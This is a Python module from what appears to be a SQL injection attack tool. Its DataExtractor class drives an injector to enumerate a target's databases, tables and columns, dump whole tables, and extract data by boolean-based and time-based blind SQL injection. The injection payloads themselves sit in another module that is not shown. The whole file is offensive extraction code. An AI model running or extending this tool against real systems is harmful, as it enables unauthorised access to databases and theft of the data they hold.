#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Data Extraction Module
"""

from concurrent.futures import ThreadPoolExecutor
from utils.colors import Colors

class DataExtractor:
    def __init__(self, injector):
        self.injector = injector
        self.dbms = injector.dbms
    
    def get_databases(self):
        print(f"{Colors.YELLOW}[*] Enumerating databases...{Colors.END}")
        
        count = self.injector.get_db_count()
        if count == 0:
            count = 10  # Fallback
        
        databases = []
        for i in range(count):
            db_name = self.injector.get_db_name(i)
            if db_name:
                databases.append(db_name)
        
        return databases
    
    def get_tables(self, database=None):
        if not database:
            databases = self.get_databases()
            if databases:
                database = databases[0]
            else:
                database = 'information_schema'
        
        print(f"{Colors.YELLOW}[*] Enumerating tables from '{database}'...{Colors.END}")
        
        count = self.injector.get_table_count(database)
        if count == 0:
            count = 50  # Fallback
        
        tables = []
        for i in range(count):
            table_name = self.injector.get_table_name(database, i)
            if table_name:
                tables.append(f"{database}.{table_name}")
        
        return tables
    
    def get_columns(self, database=None, table=None):
        if not database or not table:
            tables = self.get_tables(database)
            if tables:
                parts = tables[0].split('.')
                database = parts[0]
                table = parts[1]
            else:
                return []
        
        print(f"{Colors.YELLOW}[*] Enumerating columns from '{database}.{table}'...{Colors.END}")
        
        count = self.injector.get_column_count(database, table)
        if count == 0:
            count = 20  # Fallback
        
        columns = []
        for i in range(count):
            col_name = self.injector.get_column_name(database, table, i)
            if col_name:
                columns.append(col_name)
        
        return columns
    
    def dump_table(self, database, table, columns=None):
        if not columns:
            columns = self.get_columns(database, table)
        
        if not columns:
            print(f"{Colors.RED}[!] No columns found{Colors.END}")
            return []
        
        print(f"{Colors.YELLOW}[*] Dumping data from '{database}.{table}'...{Colors.END}")
        
        data = self.injector.get_data(database, table, columns)
        return data
    
    def dump_all(self):
        databases = self.get_databases()
        
        for db in databases:
            tables = self.get_tables(db)
            for table_full in tables:
                parts = table_full.split('.')
                if len(parts) == 2:
                    db_name, table_name = parts
                    columns = self.get_columns(db_name, table_name)
                    data = self.dump_table(db_name, table_name, columns)
                    
                    if data:
                        print(f"\n{Colors.GREEN}[+] Dumped {len(data)} rows from {table_full}{Colors.END}")
                        for row in data[:10]:  # Show first 10
                            print(f"    {row}")
    
    def blind_dump(self, query, max_length=100):
        """Dump data using boolean-based blind SQLi"""
        print(f"{Colors.YELLOW}[*] Blind extraction started...{Colors.END}")
        
        length = self.injector.blind_extract_length(query)
        if length == 0:
            length = max_length
        
        result = ""
        for i in range(1, length + 1):
            char = self.injector.blind_extract_char(query, i)
            if char:
                result += char
                print(f"\r{Colors.CYAN}[*] Extracting: {result}{Colors.END}", end='')
            else:
                break
        
        print()
        return result
    
    def time_based_dump(self, query, max_length=100):
        """Dump data using time-based blind SQLi"""
        print(f"{Colors.YELLOW}[*] Time-based extraction started (this may take a while)...{Colors.END}")
        
        length = self.injector.blind_extract_length(query)
        if length == 0:
            length = max_length
        
        result = ""
        for i in range(1, length + 1):
            char = self.injector.time_based_extract_char(query, i)
            if char:
                result += char
                print(f"\r{Colors.CYAN}[*] Extracting: {result}{Colors.END}", end='')
            else:
                break
        
        print()
        return result
